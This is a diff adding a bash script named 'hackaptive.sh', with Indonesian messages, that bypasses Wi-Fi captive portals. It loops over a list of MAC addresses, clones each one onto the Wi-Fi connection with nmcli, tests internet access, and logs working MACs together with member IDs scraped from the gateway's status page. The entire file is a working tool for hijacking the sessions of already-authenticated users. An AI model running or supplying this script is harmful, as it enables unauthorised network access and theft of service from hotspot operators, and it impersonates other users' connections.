@@ -1,0 +1,94 @@
+#!/bin/bash
+# =========================================================================== #
+#           FILE:  hackaptive.sh                                              #
+#          USAGE:  sudo ./hackaptive.sh                                       #
+# =========================================================================== #
+
+
+# Find the initial parameters of wireless interface.
+interface="$(ip -o -4 route show to default | awk '/dev/ {print $5}')"
+wifissid="$(iw dev "$interface" link | awk '/SSID/ {print $NF}')"
+status="FINDMACS"
+MAC="raw.txt"
+save="succes.txt"
+
+function root() {
+        if ! [ $(id -u) = 0 ]; then
+         echo "The script need to be run as root." >&2
+         exit 0
+        fi
+}
+
+function iden() {
+	gateway="$(ip -o -4 route show to default | awk '/via/ {print $3}')"
+	jumlah="$(cat "$save" | grep -c ':')"
+	macaddress="$(ip -0 addr show dev "$interface" \
+              | awk '/link/ && /ether/ {print $2}' \
+              | tr '[:upper:]' '[:lower:]')"
+	id="$(curl "$gateway"/status -s | awk '/Member/{print $137}'| cut -d ">"  -f 2| cut -d "<" -f 1)"
+}
+
+
+# status connection network
+
+function status() {
+clear
+echo "                       "$status"                        "
+echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+echo "Interface         :" "$interface"
+echo "Wifi SSID         :" "$wifissid"
+echo "ID Member	  :" "$id"
+echo "MAC address       :" "$macaddress"
+echo "Mac Tersimpan     :" "$jumlah"
+echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+}
+
+function finding() {
+
+
+	sort "$save" >> null && rm "$save"
+	uniq -i null "$save" && rm null
+}
+
+
+function rubah() {
+		clear
+                nmcli connection down "$wifissid" 
+                echo "Koneksi terputus"
+                nmcli connection modify "$wifissid" wifi.cloned-mac-address $M 
+                echo "Menyambungkan koneksi ......"
+                nmcli connection up "$wifissid"
+                clear
+		iden
+                status
+}
+
+#  Test internet access
+function check() {
+	wget -q --spider http://google.com #--timeout=30
+	if [ $? -eq 0 ]; 
+	then
+		iden
+		echo "$macaddress" "--->" "$id" >> "$save"
+		finding
+		iden
+		status
+
+	fi
+}
+
+
+function main() {
+        for M in $(<$MAC)
+        do
+		if [[ "${M:0:1}" != "#" ]]
+		then
+		rubah 
+		check
+		fi
+	done
+}
+
+
+root
+main
